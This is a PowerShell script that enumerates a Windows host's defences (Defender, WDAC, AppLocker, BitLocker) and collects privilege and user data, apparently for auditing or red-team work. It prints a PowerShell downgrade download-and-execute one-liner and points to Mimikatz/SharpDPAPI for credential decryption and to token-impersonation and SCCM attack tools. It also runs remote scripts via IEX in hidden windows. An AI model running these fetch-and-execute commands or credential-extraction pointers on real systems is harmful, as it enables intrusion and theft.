$DATE = Get-Date -Format "yyyyMMdd_HHmm"
$USER = $env:USERNAME
$OUT = "$env:USERPROFILE\Downloads\fkad-$DATE-$USER"
New-Item -ItemType Directory -Path $OUT -Force | Out-Null

# Start logging
$logFile = "$OUT\fkad-run.log"
Start-Transcript -Path $logFile -Append -IncludeInvocationHeader

function Banner {
    Write-Host ""
    Write-Host "       _____         _____         _____         _____         _____" -ForegroundColor DarkGray
    Write-Host "     .'     '.     .'     '.     .'     '.     .'     '.     .'     '." -ForegroundColor DarkGray
    Write-Host "    /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \" -ForegroundColor DarkGray
    Write-Host "   |           | |           | |           | |           | |           |" -ForegroundColor DarkGray
    Write-Host "   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |" -ForegroundColor DarkGray
    Write-Host "    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /" -ForegroundColor DarkGray
    Write-Host "     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' " -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "    fkad local by @fkxdr" -ForegroundColor DarkGray
    Write-Host ""
}

function Run {
    param($Label, $Block, $File)
    try {
        $result = & $Block
        $result | Out-File "$OUT\$File" -Encoding utf8
        Write-Host "[OK]   $Label -> $File" -ForegroundColor Green
    } catch {
        Write-Host "[--]   $Label failed: $_" -ForegroundColor DarkGray
    }
}

function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

Banner

Write-Host "[*]   Device: $($env:COMPUTERNAME)" -ForegroundColor DarkGray
Write-Host "[*]   User: $($env:USERNAME)" -ForegroundColor DarkGray
Write-Host ""

$isAdmin = IsAdmin
if ($isAdmin) {
    Write-Host "[OK]   Running as administrator" -ForegroundColor Red
} else {
    Write-Host "[OK]   Not running as administrator" -ForegroundColor Green
}

# Powershell downgrade
try {
    $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
    $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
    if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
        Write-Host "[KO]   PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor DarkRed
        Write-Host "       powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
    } else {
        Write-Host "[OK]   PowerShell downgrade not possible" -ForegroundColor Green
    }
} catch {
    Write-Host "       - PowerShell downgrade requires more privs" -ForegroundColor DarkGray
}

# Token Impersonation
if ($isAdmin) {
    try {
        $processes = Get-Process | Where-Object { $_.SessionId -gt 0 }
        if ($processes.Count -gt 1) {
            Write-Host "       - Token impersonation might be possible: https://github.com/Shac0x/Invoke-Totem" -ForegroundColor DarkRed
        }
    } catch {
        Write-Host "       - Token enumeration for impersonation failed" -ForegroundColor DarkYellow
    }
} else {
    Write-Host "       - Token impersonation requires more privs" -ForegroundColor DarkGray
}

# Language Mode Check
$languageMode = $ExecutionContext.SessionState.LanguageMode
if ($languageMode -eq "FullLanguage") {
    Write-Host "[KO]   PowerShell language mode: FullLanguage" -ForegroundColor DarkRed
} elseif ($languageMode -eq "ConstrainedLanguage") {
    Write-Host "[OK]   PowerShell language mode: Constrained Language Mode" -ForegroundColor Green
} else {
    Write-Host "[--]   PowerShell language mode:: $languageMode" -ForegroundColor DarkYellow
}

Write-Host ""

# AMRunningMode Status
$DefenderPreferences = Get-MpPreference
$DefenderStatus = Get-MpComputerStatus
$AMRunningMode = $DefenderStatus.AMRunningMode
if ($AMRunningMode -eq "Normal" -or $AMRunningMode -eq "EDR Blocked") {
    Write-Host "[OK]   Microsoft Defender is running in Active Mode" -ForegroundColor Green
} elseif ($AMRunningMode -eq "Passive" -or $AMRunningMode -eq "SxS Passive Mode") {
    Write-Host "[KO]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkRed
    
} else {
    Write-Host "[??]   Microsoft Defender is running in $AMRunningMode $AMRunningMode" -ForegroundColor DarkYellow
}

# Real-Time Protection
try {
    $realTimeEnabled = $defenderStatus.RealTimeProtectionEnabled
    $monitoringDisabled = $DefenderPreferences.DisableRealtimeMonitoring
    if ($realTimeEnabled -eq $true -or $monitoringDisabled -eq $false) {
        Write-Host "       - Real Time Protection is enabled" -ForegroundColor Green
    } else {
        Write-Host "       [KO] Real Time Protection is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "       - Real-Time Protection status is unknown" -ForegroundColor DarkYellow
}

# MDE Sensor
try {
    $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
    if ($MDEservice.Status -eq "Running") {
        Write-Host "       - Microsoft Defender for Endpoint Sensor is enabled" -ForegroundColor Green
    } else {
        Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
}

# Network Protection
try {
    $NetworkProtectionValue = (Get-MpPreference).EnableNetworkProtection
    if ($NetworkProtectionValue -eq 1) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is enabled" -ForegroundColor Green
    } elseif ($NetworkProtectionValue -eq 0) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is disabled" -ForegroundColor DarkRed
    } elseif ($NetworkProtectionValue -eq 2) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is in audit mode" -ForegroundColor DarkYellow
    }
} catch {
    Write-Host "       - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
}

# Memory Integrity
try {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
        $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
        if ($hvciStatus -eq 1) {
            Write-Host "       - Memory Integrity is enabled" -ForegroundColor Green
        } else {
            Write-Host "       - Memory Integrity is disabled" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "       - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "       - Memory Integrity is unknown" -ForegroundColor DarkYellow
}

# Tamper Protection
$TamperProtectionStatus = $DefenderStatus.IsTamperProtected
$TamperProtectionManage = $DefenderStatus.TamperProtectionSource

if ($TamperProtectionStatus -eq $true) {
    Write-Host "       - Tamper Protection is enabled" -ForegroundColor Green
} else {
    Write-Host "       - Tamper Protection is disabled" -ForegroundColor DarkRed
}

# Behavior Monitoring
if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
    Write-Host "       - Behavior Monitoring is enabled" -ForegroundColor Green
} else {
    Write-Host "       - Behavior Monitoring is disabled" -ForegroundColor DarkRed
}


# Exclusions
if ($isAdmin) {
    $exclusionExtensions = $DefenderPreferences.ExclusionExtension
    $exclusionPaths = $DefenderPreferences.ExclusionPath
    $exclusionProcesses = $DefenderPreferences.ExclusionProcess
    
    $hasAnyExclusions = ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) -or `
                        ($exclusionPaths -and $exclusionPaths.Count -gt 0) -or `
                        ($exclusionProcesses -and $exclusionProcesses.Count -gt 0)
    
    if ($hasAnyExclusions) {
        Write-Host "[KO]   Exclusions found" -ForegroundColor DarkRed
        if ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) {
            Write-Host "       - Extension exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionPaths -and $exclusionPaths.Count -gt 0) {
            Write-Host "       - Path exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionProcesses -and $exclusionProcesses.Count -gt 0) {
            Write-Host "       - Process exclusions found" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "[OK]   No exclusions found" -ForegroundColor Green
    }
} else {
    Write-Host "       - Exclusions require more permissions to view" -ForegroundColor DarkGray
}

Write-Host ""

# BitLocker
$bitlockerStatus = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')
if ($bitlockerStatus -eq 1) {
    Write-Host "[OK]   C: drive is BitLocker encrypted" -ForegroundColor Green
} elseif ($bitlockerStatus -eq 2) {
    Write-Host "[KO]   C: drive is not BitLocker encrypted" -ForegroundColor DarkRed
} else {
    Write-Host "[??]   C: drive BitLocker encryption is unknown" -ForegroundColor DarkYellow
}


# WDAC
try {
    $cipolicies = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
    $codeIntegrityStatus = $cipolicies.CodeIntegrityPolicyEnforcementStatus
    $userModeStatus = $cipolicies.UsermodeCodeIntegrityPolicyEnforcementStatus

    $policyDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
    $policyCount = 0
    if (Test-Path $policyDir) {
        $activePolicies = Get-ChildItem -Path $policyDir -Filter "*.cip" -ErrorAction SilentlyContinue
        $policyCount = $activePolicies.Count
    }

    if ($policyCount -gt 0) {
        Write-Host "[OK]   WDAC Active Policies: $policyCount policies deployed" -ForegroundColor Green
    } else {
        Write-Host "[KO]   WDAC Active Policies: No policies deployed" -ForegroundColor DarkRed
    }

    $ciLabel = switch ($codeIntegrityStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
    $ciColor = switch ($codeIntegrityStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
    $ciStatus = switch ($codeIntegrityStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
    Write-Host "       - Kernel Mode Code Integrity: $ciLabel" -ForegroundColor $ciColor

    $umciLabel = switch ($userModeStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
    $umciColor = switch ($userModeStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
    $umciStatus = switch ($userModeStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
    Write-Host "       - User Mode Code Integrity: $umciLabel" -ForegroundColor $umciColor

} catch {
    Write-Host "[??]   WDAC: Unable to query" -ForegroundColor DarkYellow
}

# AppLocker
try {
    $applockerService = Get-Service -Name "AppIDSvc" -ErrorAction Stop
    if ($applockerService.Status -eq "Running") {
        Write-Host "[OK]   AppLocker Service (AppIDSvc) is running" -ForegroundColor Green
    } else {
        Write-Host "[KO]   AppLocker Service (AppIDSvc) is not running" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "[KO]   AppLocker Service (AppIDSvc) was not found" -ForegroundColor DarkRed
}

$applockerRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
$applockerConfigured = $false
$applockerCollections = @("Exe", "Msi", "Script", "Dll", "Appx")
foreach ($collection in $applockerCollections) {
    $collPath = "$applockerRegPath\$collection"
    if (Test-Path $collPath) {
        $rules = Get-ChildItem -Path $collPath -ErrorAction SilentlyContinue
        if ($rules.Count -gt 0) {
            $applockerConfigured = $true
            Write-Host "AppLocker $collection Rules :                                    [KO] $($rules.Count) rule(s) configured" -ForegroundColor DarkRed
        }
    }
}
if (-not $applockerConfigured) {
    Write-Host "       - There are no baselines or rules configured" -ForegroundColor DarkRed
}

# Edge SmartScreen
$edgeSSvalue = $null
$policyPaths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
    "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
)
foreach ($path in $policyPaths) {
    if (Test-Path $path) {
        try {
            $edgeSSvalue = Get-ItemPropertyValue -Path $path -Name "SmartScreenEnabled" -ErrorAction Stop
            break
        } catch {}
    }
}
if ($edgeSSvalue -eq 0) {
    Write-Host "[KO]   Microsoft Edge SmartScreen is disabled" -ForegroundColor DarkRed
} else {
    Write-Host "[OK]   Microsoft Edge SmartScreen is enabled" -ForegroundColor Green
}

# SCCM/SCOM Enumeration
try {
    $smContainer = Get-ADObject -Filter {Name -eq "System Management"} -SearchBase $([ADSI]"LDAP://RootDSE").defaultNamingContext -ErrorAction Stop
    
    if ($smContainer) {
        Write-Host "[KO]   System Center infrastructure detected (SCCM/SCOM)" -ForegroundColor DarkRed
        Write-Host "       - SCCM: Use SharpSCCM - https://github.com/Mayyhem/SharpSCCM" -ForegroundColor DarkGray
        Write-Host "       - SCOM: Use SharpSCOM - https://github.com/breakfix/SharpSCOM" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "[OK]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
}

Write-Host ""

Run "Privileges (whoami /all)" { whoami /all } "whoami_all.txt"

Run "DNS Cache" { ipconfig /displaydns } "dns_cache.txt"

# Admins and logged on users
$adminOutput = net localgroup administrators
$loggedOutput = query user 2>$null
$combined = @()
$combined += "=== LOCAL ADMINS ===" 
$combined += $adminOutput
$combined += "`n=== LOGGED ON USERS ==="
$combined += $loggedOutput
$combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
Write-Host "[OK]   Users & Admins -> users_and_admins.txt" -ForegroundColor Green

Run "Scheduled Tasks" { Get-ScheduledTask | Format-Table -AutoSize } "scheduled_tasks.txt"

# Check WSL
try {
    $wsl = wsl --list --verbose 2>&1
    if ($wsl -match "NAME") {
        Write-Host "[KO] WSL is installed and has distributions" -ForegroundColor DarkRed
        foreach ($line in $wsl) {
            if ($line -match "\S") {
                Write-Host "       $line" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
}

# DPAPI Artefacts Check
try {
    $dpapi = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
    if ($dpapi -and $dpapi.Count -gt 0) {
        Write-Host "[??]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
        Write-Host "       - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
    } else {
        Write-Host "[OK]   No DPAPI credentials found" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK]   DPAPI check skipped" -ForegroundColor Green
}

# Startup items
$startupOutput = Get-CimInstance Win32_StartupCommand |
    Where-Object { $_.Command -notmatch "SecurityHealthSystray|Windows Defender|MpCmdRun" } |
    Format-Table -AutoSize

if ($startupOutput) {
    $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
    Write-Host "[KO]   Startup items found -> startup_items.txt" -ForegroundColor Red
} else {
    Write-Host "[OK]   No non-standard startup items found" -ForegroundColor Green
}

# MSI repairing
$msiOutput = Get-WmiObject -Class Win32_Product |
    Where-Object { $_.Vendor -notin @("Microsoft Corporation","Microsoft","Python Software Foundation","Parallels International GmbH") } |
    ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            Vendor = $_.Vendor
            Version = $_.Version
        }
    }

if ($msiOutput) {
    $msiOutput | Out-File "$OUT\msi_list.txt" -Encoding utf8
    Write-Host "[KO]   MSI repair LPE possible -> msi_list.txt" -ForegroundColor DarkGray
} else {
    Write-Host "[OK]   No MSI repair LPE vectors found" -ForegroundColor Green
}

Write-Host ""

# PrivescCheck
try {
    $cmd = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Severity High, Medium -Report '$OUT\PrivescCheck' -Format TXT *>&1"
    Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
    Write-Host "[OK]   PrivescCheck -> PrivescCheck.txt" -ForegroundColor Green
    Write-Host "       - Additional checks can be done with WinPEAS, but Defender must be bypassed" -ForegroundColor DarkGray
} catch {
    Write-Host "[--]   PrivescCheck failed: $_" -ForegroundColor DarkGray
}

# ScriptSentry
try {
    $cmd = "IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/techspence/ScriptSentry/main/Invoke-ScriptSentry.ps1').Content; Invoke-ScriptSentry *>&1 | Out-File '$OUT\scriptsentry.txt' -Encoding utf8"
    Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
    Write-Host "[OK]   ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
} catch {
    Write-Host "[--]   ScriptSentry failed: $_" -ForegroundColor DarkGray
}

# HardeningKitty
try {
    $hardKittyDir = "$env:TEMP\HardeningKitty"
    $cmd = "New-Item -ItemType Directory -Path '$hardKittyDir\lists' -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/scipag/HardeningKitty/master/HardeningKitty.psm1' -OutFile '$hardKittyDir\HardeningKitty.psm1'; `$lists = @('finding_list_0x6d69636b_machine.csv','finding_list_0x6d69636b_user.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_machine.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_user.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_machine.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_user.csv','finding_list_cis_microsoft_windows_server_2019_1809_3.0.0_machine.csv','finding_list_cis_microsoft_windows_server_2022_22h2_3.0.0_machine.csv'); foreach (`$list in `$lists) { Invoke-WebRequest -Uri `"https://raw.githubusercontent.com/scipag/HardeningKitty/master/lists/`$list`" -OutFile `"$hardKittyDir\lists\`$list`" -ErrorAction SilentlyContinue }; Import-Module '$hardKittyDir\HardeningKitty.psm1' -Force; Invoke-HardeningKitty -Mode Audit -Report -ReportFile '$OUT\HardeningKitty.txt' *>&1"
    Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
    Write-Host "[OK]   HardeningKitty -> HardeningKitty.txt" -ForegroundColor Green
} catch {
    Write-Host "[--]   HardeningKitty failed: $_" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "[OK] Done. Output folder: $OUT" -ForegroundColor Green
Write-Host ""

Stop-Transcript
